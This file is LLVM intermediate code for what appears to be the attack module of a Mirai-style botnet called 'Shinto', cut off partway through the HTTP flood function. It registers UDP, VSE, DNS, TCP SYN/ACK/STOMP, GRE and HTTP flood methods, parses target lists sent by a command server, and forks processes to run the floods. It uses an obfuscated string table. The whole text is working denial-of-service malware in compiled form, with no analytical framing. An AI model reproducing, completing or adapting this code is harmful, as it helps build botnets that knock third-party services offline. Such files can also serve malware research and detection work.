; ModuleID = 'host/ir_O1/Shinto.d.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.attack_method = type { void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)*, i8 }
%struct.attack_target = type { %struct.sockaddr_in, i32, i8 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.in_addr = type { i32 }
%struct.attack_option = type { i8*, i8 }
%struct.table_value = type { i8*, i16 }
%struct.fd_set = type { [16 x i64] }
%struct.timeval = type { i64, i64 }
%struct.attack_http_state = type { i32, i8, i32, i32, i32, [512 x i8], [257 x i8], [129 x i8], [513 x i8], [9 x i8], [9 x i8], i32, i32, i32, i32, i32, [5 x [128 x i8]], i32, [1024 x i8] }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.attack_stomp_data = type { i32, i32, i32, i16, i16 }
%struct.tcphdr = type { i16, i16, i32, i32, i16, i16, i16, i16 }

@methods_len = local_unnamed_addr global i8 0, align 1
@methods = local_unnamed_addr global %struct.attack_method** null, align 8
@attack_ongoing = local_unnamed_addr global [8 x i32] zeroinitializer, align 16
@LOCAL_ADDR = common local_unnamed_addr global i32 0, align 4
@.str = private unnamed_addr constant [4 x i8] c"GET\00", align 1
@.str.1 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.2 = private unnamed_addr constant [2 x i8] c" \00", align 1
@.str.3 = private unnamed_addr constant [24 x i8] c" HTTP/1.1\0D\0AUser-Agent: \00", align 1
@.str.4 = private unnamed_addr constant [9 x i8] c"\0D\0AHost: \00", align 1
@.str.5 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.6 = private unnamed_addr constant [9 x i8] c"Cookie: \00", align 1
@.str.7 = private unnamed_addr constant [3 x i8] c"; \00", align 1
@.str.8 = private unnamed_addr constant [5 x i8] c"\0D\0A\0D\0A\00", align 1
@.str.9 = private unnamed_addr constant [2 x i8] c";\00", align 1
@.str.10 = private unnamed_addr constant [5 x i8] c"http\00", align 1
@.str.11 = private unnamed_addr constant [5 x i8] c"url=\00", align 1
@.str.12 = private unnamed_addr constant [5 x i8] c"POST\00", align 1
@.str.13 = private unnamed_addr constant [2 x i8] c"'\00", align 1
@.str.14 = private unnamed_addr constant [2 x i8] c"=\00", align 1
@table = common local_unnamed_addr global [63 x %struct.table_value] zeroinitializer, align 16
@table_key = local_unnamed_addr global i32 1043935, align 4

; Function Attrs: noinline nounwind uwtable
define signext i8 @attack_init() local_unnamed_addr #0 {
  tail call fastcc void @add_attack(i8 zeroext 0, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_udp_generic)
  tail call fastcc void @add_attack(i8 zeroext 1, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_udp_vse)
  tail call fastcc void @add_attack(i8 zeroext 2, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_udp_dns)
  tail call fastcc void @add_attack(i8 zeroext 8, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_udp_plain)
  tail call fastcc void @add_attack(i8 zeroext 3, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_tcp_syn)
  tail call fastcc void @add_attack(i8 zeroext 4, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_tcp_ack)
  tail call fastcc void @add_attack(i8 zeroext 5, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_tcp_stomp)
  tail call fastcc void @add_attack(i8 zeroext 6, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_gre_ip)
  tail call fastcc void @add_attack(i8 zeroext 7, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_gre_eth)
  tail call fastcc void @add_attack(i8 zeroext 9, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* bitcast (void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_app_http to void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)*))
  ret i8 1
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc void @add_attack(i8 zeroext, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)*) unnamed_addr #0 {
  %3 = tail call noalias i8* @calloc(i64 1, i64 16) #10
  %4 = getelementptr inbounds i8, i8* %3, i64 8
  store i8 %0, i8* %4, align 8
  %5 = bitcast i8* %3 to void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)**
  store void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* %1, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)** %5, align 8
  %6 = load i8*, i8** bitcast (%struct.attack_method*** @methods to i8**), align 8
  %7 = load i8, i8* @methods_len, align 1
  %8 = zext i8 %7 to i64
  %9 = shl nuw nsw i64 %8, 3
  %10 = add nuw nsw i64 %9, 8
  %11 = tail call i8* @realloc(i8* %6, i64 %10) #10
  %12 = bitcast i8* %11 to %struct.attack_method**
  store i8* %11, i8** bitcast (%struct.attack_method*** @methods to i8**), align 8
  %13 = load i8, i8* @methods_len, align 1
  %14 = add i8 %13, 1
  store i8 %14, i8* @methods_len, align 1
  %15 = zext i8 %13 to i64
  %16 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %12, i64 %15
  %17 = bitcast %struct.attack_method** %16 to i8**
  store i8* %3, i8** %17, align 8
  ret void
}

; Function Attrs: nounwind
declare noalias i8* @calloc(i64, i64) local_unnamed_addr #1

; Function Attrs: nounwind
declare noalias i8* @realloc(i8* nocapture, i64) local_unnamed_addr #1

; Function Attrs: noinline nounwind uwtable
define void @attack_parse(i8*, i32) local_unnamed_addr #0 {
  %3 = icmp ult i32 %1, 4
  br i1 %3, label %.thread80, label %4

; <label>:4:                                      ; preds = %2
  %5 = bitcast i8* %0 to i32*
  %6 = load i32, i32* %5, align 4
  %7 = tail call i32 @ntohl(i32 %6) #11
  %8 = icmp eq i32 %1, 4
  br i1 %8, label %.thread80, label %9

; <label>:9:                                      ; preds = %4
  %10 = getelementptr inbounds i8, i8* %0, i64 4
  %11 = load i8, i8* %10, align 1
  %12 = icmp eq i32 %1, 5
  br i1 %12, label %.thread80, label %13

; <label>:13:                                     ; preds = %9
  %14 = getelementptr inbounds i8, i8* %0, i64 5
  %15 = getelementptr inbounds i8, i8* %0, i64 6
  %16 = load i8, i8* %14, align 1
  %17 = zext i8 %16 to i32
  %18 = icmp eq i8 %16, 0
  br i1 %18, label %.thread80, label %19

; <label>:19:                                     ; preds = %13
  %20 = add i32 %1, -6
  %21 = sext i32 %20 to i64
  %22 = zext i8 %16 to i64
  %23 = mul nuw nsw i64 %22, 5
  %24 = icmp ult i64 %21, %23
  br i1 %24, label %.thread80, label %.lr.ph88.preheader

.lr.ph88.preheader:                               ; preds = %19
  %25 = tail call noalias i8* @calloc(i64 %22, i64 24) #10
  %26 = bitcast i8* %25 to %struct.attack_target*
  %27 = add nsw i32 %17, -1
  %28 = zext i32 %27 to i64
  %29 = mul nuw nsw i64 %28, 5
  %30 = add nuw nsw i64 %29, 11
  %scevgep = getelementptr i8, i8* %0, i64 %30
  %wide.trip.count = zext i8 %16 to i64
  %xtraiter = and i64 %wide.trip.count, 1
  %lcmp.mod = icmp eq i64 %xtraiter, 0
  br i1 %lcmp.mod, label %.lr.ph88.prol.loopexit, label %.lr.ph88.prol.preheader

.lr.ph88.prol.preheader:                          ; preds = %.lr.ph88.preheader
  br label %.lr.ph88.prol

.lr.ph88.prol:                                    ; preds = %.lr.ph88.prol.preheader
  %31 = bitcast i8* %15 to i32*
  %32 = load i32, i32* %31, align 4
  %33 = getelementptr inbounds i8, i8* %25, i64 16
  %34 = bitcast i8* %33 to i32*
  store i32 %32, i32* %34, align 4
  %35 = getelementptr inbounds i8, i8* %0, i64 10
  %36 = getelementptr inbounds i8, i8* %0, i64 11
  %37 = load i8, i8* %35, align 1
  %38 = getelementptr inbounds i8, i8* %25, i64 20
  store i8 %37, i8* %38, align 4
  %39 = bitcast i8* %25 to i16*
  store i16 2, i16* %39, align 4
  %40 = load i32, i32* %34, align 4
  %41 = getelementptr inbounds i8, i8* %25, i64 4
  %42 = bitcast i8* %41 to i32*
  store i32 %40, i32* %42, align 4
  br label %.lr.ph88.prol.loopexit

.lr.ph88.prol.loopexit:                           ; preds = %.lr.ph88.preheader, %.lr.ph88.prol
  %indvars.iv91.unr = phi i64 [ 0, %.lr.ph88.preheader ], [ 1, %.lr.ph88.prol ]
  %.087.unr = phi i8* [ %15, %.lr.ph88.preheader ], [ %36, %.lr.ph88.prol ]
  %43 = icmp eq i8 %16, 1
  br i1 %43, label %._crit_edge, label %.lr.ph88.preheader.new

.lr.ph88.preheader.new:                           ; preds = %.lr.ph88.prol.loopexit
  br label %.lr.ph88

.lr.ph88:                                         ; preds = %.lr.ph88, %.lr.ph88.preheader.new
  %indvars.iv91 = phi i64 [ %indvars.iv91.unr, %.lr.ph88.preheader.new ], [ %indvars.iv.next92.1, %.lr.ph88 ]
  %.087 = phi i8* [ %.087.unr, %.lr.ph88.preheader.new ], [ %58, %.lr.ph88 ]
  %44 = bitcast i8* %.087 to i32*
  %45 = load i32, i32* %44, align 4
  %46 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %26, i64 %indvars.iv91, i32 1
  store i32 %45, i32* %46, align 4
  %47 = getelementptr inbounds i8, i8* %.087, i64 4
  %48 = getelementptr inbounds i8, i8* %.087, i64 5
  %49 = load i8, i8* %47, align 1
  %50 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %26, i64 %indvars.iv91, i32 2
  store i8 %49, i8* %50, align 4
  %51 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %26, i64 %indvars.iv91, i32 0, i32 0
  store i16 2, i16* %51, align 4
  %52 = load i32, i32* %46, align 4
  %53 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %26, i64 %indvars.iv91, i32 0, i32 2, i32 0
  store i32 %52, i32* %53, align 4
  %indvars.iv.next92 = add nuw nsw i64 %indvars.iv91, 1
  %54 = bitcast i8* %48 to i32*
  %55 = load i32, i32* %54, align 4
  %56 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %26, i64 %indvars.iv.next92, i32 1
  store i32 %55, i32* %56, align 4
  %57 = getelementptr inbounds i8, i8* %.087, i64 9
  %58 = getelementptr inbounds i8, i8* %.087, i64 10
  %59 = load i8, i8* %57, align 1
  %60 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %26, i64 %indvars.iv.next92, i32 2
  store i8 %59, i8* %60, align 4
  %61 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %26, i64 %indvars.iv.next92, i32 0, i32 0
  store i16 2, i16* %61, align 4
  %62 = load i32, i32* %56, align 4
  %63 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %26, i64 %indvars.iv.next92, i32 0, i32 2, i32 0
  store i32 %62, i32* %63, align 4
  %indvars.iv.next92.1 = add nsw i64 %indvars.iv91, 2
  %exitcond.1 = icmp eq i64 %indvars.iv.next92.1, %wide.trip.count
  br i1 %exitcond.1, label %._crit_edge.unr-lcssa, label %.lr.ph88

._crit_edge.unr-lcssa:                            ; preds = %.lr.ph88
  br label %._crit_edge

._crit_edge:                                      ; preds = %.lr.ph88.prol.loopexit, %._crit_edge.unr-lcssa
  %64 = add i32 %1, -6
  %65 = mul nsw i32 %17, -5
  %66 = add i32 %64, %65
  %67 = icmp eq i32 %66, 0
  br i1 %67, label %.loopexit81.thread, label %68

; <label>:68:                                     ; preds = %._crit_edge
  %69 = load i8, i8* %scevgep, align 1
  %70 = icmp eq i8 %69, 0
  br i1 %70, label %.loopexit, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %68
  %71 = zext i8 %69 to i64
  %72 = tail call noalias i8* @calloc(i64 %71, i64 16) #10
  %73 = bitcast i8* %72 to %struct.attack_option*
  %74 = getelementptr inbounds i8, i8* %scevgep, i64 1
  %75 = add i32 %66, -1
  %76 = zext i8 %69 to i64
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %89
  %indvars.iv = phi i64 [ 0, %.lr.ph.preheader ], [ %indvars.iv.next, %89 ]
  %.184 = phi i8* [ %74, %.lr.ph.preheader ], [ %95, %89 ]
  %.17583 = phi i32 [ %75, %.lr.ph.preheader ], [ %96, %89 ]
  %77 = icmp eq i32 %.17583, 0
  br i1 %77, label %.loopexit81.loopexit, label %78

; <label>:78:                                     ; preds = %.lr.ph
  %79 = load i8, i8* %.184, align 1
  %80 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %73, i64 %indvars.iv, i32 1
  store i8 %79, i8* %80, align 8
  %81 = icmp eq i32 %.17583, 1
  br i1 %81, label %.loopexit81.loopexit, label %82

; <label>:82:                                     ; preds = %78
  %83 = getelementptr inbounds i8, i8* %.184, i64 1
  %84 = getelementptr inbounds i8, i8* %.184, i64 2
  %85 = load i8, i8* %83, align 1
  %86 = add i32 %.17583, -2
  %87 = zext i8 %85 to i32
  %88 = icmp slt i32 %86, %87
  br i1 %88, label %.loopexit81.loopexit, label %89

; <label>:89:                                     ; preds = %82
  %90 = add nuw nsw i32 %87, 1
  %91 = zext i32 %90 to i64
  %92 = tail call noalias i8* @calloc(i64 %91, i64 1) #10
  %93 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %73, i64 %indvars.iv, i32 0
  store i8* %92, i8** %93, align 8
  tail call void @util_memcpy(i8* %92, i8* %84, i32 %87) #10
  %94 = zext i8 %85 to i64
  %95 = getelementptr inbounds i8, i8* %84, i64 %94
  %96 = sub nsw i32 %86, %87
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %97 = icmp slt i64 %indvars.iv.next, %76
  br i1 %97, label %.lr.ph, label %.loopexit.loopexit

.loopexit.loopexit:                               ; preds = %89
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %68
  %.070 = phi %struct.attack_option* [ null, %68 ], [ %73, %.loopexit.loopexit ]
  %98 = tail call i32* @__errno_location() #11
  store i32 0, i32* %98, align 4
  tail call void @attack_start(i32 %7, i8 zeroext %11, i8 zeroext %16, %struct.attack_target* %26, i8 zeroext %69, %struct.attack_option* %.070)
  br label %.loopexit81

.loopexit81.loopexit:                             ; preds = %.lr.ph, %78, %82
  br label %.loopexit81

.loopexit81:                                      ; preds = %.loopexit81.loopexit, %.loopexit
  %.171 = phi %struct.attack_option* [ %.070, %.loopexit ], [ %73, %.loopexit81.loopexit ]
  %99 = icmp eq i8* %25, null
  br i1 %99, label %100, label %.loopexit81.thread

.loopexit81.thread:                               ; preds = %._crit_edge, %.loopexit81
  %.17195 = phi %struct.attack_option* [ %.171, %.loopexit81 ], [ null, %._crit_edge ]
  %.07393 = phi i8 [ %69, %.loopexit81 ], [ undef, %._crit_edge ]
  tail call void @free(i8* nonnull %25) #10
  br label %100

; <label>:100:                                    ; preds = %.loopexit81, %.loopexit81.thread
  %.17196 = phi %struct.attack_option* [ %.171, %.loopexit81 ], [ %.17195, %.loopexit81.thread ]
  %.07394 = phi i8 [ %69, %.loopexit81 ], [ %.07393, %.loopexit81.thread ]
  %101 = icmp eq %struct.attack_option* %.17196, null
  br i1 %101, label %.thread80, label %102

; <label>:102:                                    ; preds = %100
  %103 = zext i8 %.07394 to i32
  tail call fastcc void @free_opts(%struct.attack_option* nonnull %.17196, i32 %103)
  br label %.thread80

.thread80:                                        ; preds = %2, %4, %9, %13, %19, %100, %102
  ret void
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) local_unnamed_addr #2

declare void @util_memcpy(i8*, i8*, i32) local_unnamed_addr #3

; Function Attrs: nounwind readnone
declare i32* @__errno_location() local_unnamed_addr #2

; Function Attrs: noinline nounwind uwtable
define void @attack_start(i32, i8 zeroext, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) local_unnamed_addr #0 {
  %7 = tail call i32 @fork() #10
  %8 = icmp sgt i32 %7, 0
  %9 = icmp eq i32 %7, -1
  %or.cond = or i1 %8, %9
  br i1 %or.cond, label %15, label %.preheader

.preheader:                                       ; preds = %6
  %10 = load i8, i8* @methods_len, align 1
  %11 = icmp eq i8 %10, 0
  br i1 %11, label %.loopexit, label %.lr.ph

.lr.ph:                                           ; preds = %.preheader
  %12 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %13 = load i8, i8* @methods_len, align 1
  %14 = zext i8 %13 to i64
  br label %18

; <label>:15:                                     ; preds = %6
  ret void

; <label>:16:                                     ; preds = %18
  %17 = icmp slt i64 %indvars.iv.next, %14
  br i1 %17, label %18, label %.loopexit.loopexit

; <label>:18:                                     ; preds = %.lr.ph, %16
  %indvars.iv = phi i64 [ 0, %.lr.ph ], [ %indvars.iv.next, %16 ]
  %19 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %12, i64 %indvars.iv
  %20 = load %struct.attack_method*, %struct.attack_method** %19, align 8
  %21 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %20, i64 0, i32 1
  %22 = load i8, i8* %21, align 8
  %23 = icmp eq i8 %22, %1
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  br i1 %23, label %24, label %16

; <label>:24:                                     ; preds = %18
  %25 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %20, i64 0, i32 0
  %26 = load void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)*, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)** %25, align 8
  tail call void %26(i32 %0, i8 zeroext %2, %struct.attack_target* %3, i8 zeroext %4, %struct.attack_option* %5) #10
  br label %.loopexit

.loopexit.loopexit:                               ; preds = %16
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %.preheader, %24
  tail call void @exit(i32 0) #12
  unreachable
}

; Function Attrs: nounwind
declare void @free(i8* nocapture) local_unnamed_addr #1

; Function Attrs: noinline nounwind uwtable
define internal fastcc void @free_opts(%struct.attack_option*, i32) unnamed_addr #0 {
  %3 = icmp eq %struct.attack_option* %0, null
  br i1 %3, label %11, label %.preheader

.preheader:                                       ; preds = %2
  %4 = icmp sgt i32 %1, 0
  br i1 %4, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %.preheader
  %wide.trip.count = zext i32 %1 to i64
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %9
  %indvars.iv = phi i64 [ %indvars.iv.next, %9 ], [ 0, %.lr.ph.preheader ]
  %5 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %0, i64 %indvars.iv, i32 0
  %6 = load i8*, i8** %5, align 8
  %7 = icmp eq i8* %6, null
  br i1 %7, label %9, label %8

; <label>:8:                                      ; preds = %.lr.ph
  tail call void @free(i8* nonnull %6) #10
  br label %9

; <label>:9:                                      ; preds = %.lr.ph, %8
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %exitcond = icmp eq i64 %indvars.iv.next, %wide.trip.count
  br i1 %exitcond, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %9
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.preheader
  %10 = bitcast %struct.attack_option* %0 to i8*
  tail call void @free(i8* %10) #10
  br label %11

; <label>:11:                                     ; preds = %2, %._crit_edge
  ret void
}

; Function Attrs: nounwind
declare i32 @fork() local_unnamed_addr #1

; Function Attrs: noreturn nounwind
declare void @exit(i32) local_unnamed_addr #4

; Function Attrs: noinline norecurse nounwind readonly uwtable
define i8* @attack_get_opt_str(i8 zeroext, %struct.attack_option* nocapture readonly, i8 zeroext, i8* readnone) local_unnamed_addr #5 {
  %5 = icmp eq i8 %0, 0
  br i1 %5, label %.loopexit, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %4
  %6 = zext i8 %0 to i64
  br label %.lr.ph

; <label>:7:                                      ; preds = %.lr.ph
  %8 = icmp slt i64 %indvars.iv.next, %6
  br i1 %8, label %.lr.ph, label %.loopexit.loopexit

.lr.ph:                                           ; preds = %.lr.ph.preheader, %7
  %indvars.iv = phi i64 [ 0, %.lr.ph.preheader ], [ %indvars.iv.next, %7 ]
  %9 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %1, i64 %indvars.iv, i32 1
  %10 = load i8, i8* %9, align 8
  %11 = icmp eq i8 %10, %2
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  br i1 %11, label %12, label %7

; <label>:12:                                     ; preds = %.lr.ph
  %13 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %1, i64 %indvars.iv, i32 0
  %14 = load i8*, i8** %13, align 8
  br label %.loopexit

.loopexit.loopexit:                               ; preds = %7
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %4, %12
  %.09 = phi i8* [ %14, %12 ], [ %3, %4 ], [ %3, %.loopexit.loopexit ]
  ret i8* %.09
}

; Function Attrs: noinline nounwind uwtable
define i32 @attack_get_opt_int(i8 zeroext, %struct.attack_option* nocapture readonly, i8 zeroext, i32) local_unnamed_addr #0 {
  %5 = tail call i8* @attack_get_opt_str(i8 zeroext %0, %struct.attack_option* %1, i8 zeroext %2, i8* null)
  %6 = icmp eq i8* %5, null
  br i1 %6, label %9, label %7

; <label>:7:                                      ; preds = %4
  %8 = tail call i32 @util_atoi(i8* nonnull %5, i32 10) #10
  br label %9

; <label>:9:                                      ; preds = %4, %7
  %.0 = phi i32 [ %8, %7 ], [ %3, %4 ]
  ret i32 %.0
}

declare i32 @util_atoi(i8*, i32) local_unnamed_addr #3

; Function Attrs: noinline nounwind uwtable
define i32 @attack_get_opt_ip(i8 zeroext, %struct.attack_option* nocapture readonly, i8 zeroext, i32) local_unnamed_addr #0 {
  %5 = tail call i8* @attack_get_opt_str(i8 zeroext %0, %struct.attack_option* %1, i8 zeroext %2, i8* null)
  %6 = icmp eq i8* %5, null
  br i1 %6, label %9, label %7

; <label>:7:                                      ; preds = %4
  %8 = tail call i32 @inet_addr(i8* nonnull %5) #10
  br label %9

; <label>:9:                                      ; preds = %4, %7
  %.0 = phi i32 [ %8, %7 ], [ %3, %4 ]
  ret i32 %.0
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) local_unnamed_addr #1

; Function Attrs: noinline nounwind uwtable
define void @attack_app_http(i8 zeroext, %struct.attack_target* nocapture readonly, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca i32, align 4
  %6 = alloca [10241 x i8], align 16
  %7 = alloca %struct.fd_set, align 8
  %8 = alloca %struct.fd_set, align 8
  %9 = alloca %struct.timeval, align 8
  %10 = alloca %struct.sockaddr_in, align 4
  %11 = alloca [10240 x i8], align 16
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = tail call i8* @attack_get_opt_str(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 20, i8* null)
  %15 = tail call i8* @attack_get_opt_str(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 19, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i64 0, i64 0))
  %16 = tail call i8* @attack_get_opt_str(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 8, i8* null)
  %17 = tail call i8* @attack_get_opt_str(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 21, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.1, i64 0, i64 0))
  %18 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 23, i32 1)
  %19 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 80)
  %20 = trunc i32 %19 to i16
  %21 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* nonnull %21, i8 0, i64 10241, i32 16, i1 false)
  %22 = icmp eq i8* %16, null
  %23 = icmp eq i8* %17, null
  %or.cond = or i1 %22, %23
  br i1 %or.cond, label %1045, label %24

; <label>:24:                                     ; preds = %4
  %25 = tail call i32 @util_strlen(i8* %17) #10
  %26 = icmp sgt i32 %25, 255
  br i1 %26, label %1045, label %27

; <label>:27:                                     ; preds = %24
  %28 = tail call i32 @util_strlen(i8* %16) #10
  %29 = icmp sgt i32 %28, 127
  br i1 %29, label %1045, label %30

; <label>:30:                                     ; preds = %27
  %31 = tail call i32 @util_strlen(i8* %15) #10
  %32 = icmp sgt i32 %31, 9
  br i1 %32, label %1045, label %.preheader597

.preheader597:                                    ; preds = %30
  store i32 0, i32* %5, align 4
  %33 = tail call i32 @util_strlen(i8* %15) #10
  %34 = icmp sgt i32 %33, 0
  br i1 %34, label %.lr.ph637.preheader, label %._crit_edge638

.lr.ph637.preheader:                              ; preds = %.preheader597
  br label %.lr.ph637

.lr.ph637:                                        ; preds = %.lr.ph637.preheader, %42
  %35 = load i32, i32* %5, align 4
  %36 = sext i32 %35 to i64
  %37 = getelementptr inbounds i8, i8* %15, i64 %36
  %38 = load i8, i8* %37, align 1
  %.off586 = add i8 %38, -97
  %39 = icmp ult i8 %.off586, 26
  br i1 %39, label %40, label %42

; <label>:40:                                     ; preds = %.lr.ph637
  %41 = add i8 %38, -32
  store i8 %41, i8* %37, align 1
  br label %42

; <label>:42:                                     ; preds = %.lr.ph637, %40
  %43 = load i32, i32* %5, align 4
  %44 = add nsw i32 %43, 1
  store i32 %44, i32* %5, align 4
  %45 = tail call i32 @util_strlen(i8* nonnull %15) #10
  %46 = icmp slt i32 %44, %45
  br i1 %46, label %.lr.ph637, label %._crit_edge638.loopexit

._crit_edge638.loopexit:                          ; preds = %42
  br label %._crit_edge638

._crit_edge638:                                   ; preds = %._crit_edge638.loopexit, %.preheader597
  %47 = icmp slt i32 %18, 512
  %. = select i1 %47, i32 %18, i32 512
  tail call void @table_unlock_val(i8 zeroext 43)
  tail call void @table_unlock_val(i8 zeroext 44)
  tail call void @table_unlock_val(i8 zeroext 45)
  tail call void @table_unlock_val(i8 zeroext 46)
  tail call void @table_unlock_val(i8 zeroext 47)
  tail call void @table_unlock_val(i8 zeroext 48)
  tail call void @table_unlock_val(i8 zeroext 49)
  tail call void @table_unlock_val(i8 zeroext 50)
  tail call void @table_unlock_val(i8 zeroext 51)
  tail call void @table_unlock_val(i8 zeroext 52)
  tail call void @table_unlock_val(i8 zeroext 53)
  %48 = sext i32 %. to i64
  %49 = tail call noalias i8* @calloc(i64 %48, i64 3140) #10
  %50 = bitcast i8* %49 to %struct.attack_http_state*
  %51 = icmp sgt i32 %18, 0
  br i1 %51, label %.lr.ph636, label %.preheader595

.lr.ph636:                                        ; preds = %._crit_edge638
  %52 = zext i8 %0 to i32
  %53 = sext i32 %. to i64
  br label %71

.preheader595.loopexit:                           ; preds = %102
  br label %.preheader595

.preheader595:                                    ; preds = %.preheader595.loopexit, %._crit_edge638
  %54 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %7, i64 0, i32 0, i64 0
  %55 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i64 0, i32 0, i64 0
  %56 = icmp sgt i32 %18, 0
  %57 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i64 0, i32 1
  %58 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i64 0, i32 0
  %59 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 0
  %60 = bitcast i32* %12 to i8*
  %61 = bitcast %struct.sockaddr_in* %10 to i8*
  %62 = bitcast i32* %5 to i8*
  %63 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i64 0, i32 0
  %64 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i64 0, i32 2, i32 0
  %65 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i64 0, i32 1
  %66 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  %67 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 0
  %68 = icmp ne i8* %14, null
  %69 = sext i32 %. to i64
  %70 = sext i32 %. to i64
  %.not = icmp slt i32 %18, 1
  br label %.backedge596

; <label>:71:                                     ; preds = %.lr.ph636, %102
  %indvars.iv661 = phi i64 [ 0, %.lr.ph636 ], [ %indvars.iv.next662, %102 ]
  %72 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv661, i32 1
  store i8 0, i8* %72, align 4
  %73 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv661, i32 0
  store i32 -1, i32* %73, align 4
  %74 = trunc i64 %indvars.iv661 to i32
  %75 = srem i32 %74, %52
  %76 = sext i32 %75 to i64
  %77 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %76, i32 1
  %78 = load i32, i32* %77, align 4
  %79 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv661, i32 4
  store i32 %78, i32* %79, align 4
  %80 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv661, i32 6, i64 0
  %81 = tail call i32 @util_strcpy(i8* %80, i8* %17) #10
  %82 = load i8, i8* %80, align 4
  %83 = icmp eq i8 %82, 47
  br i1 %83, label %88, label %84

; <label>:84:                                     ; preds = %71
  %85 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv661, i32 6, i64 1
  %86 = tail call i32 @util_strlen(i8* %80) #10
  %87 = sext i32 %86 to i64
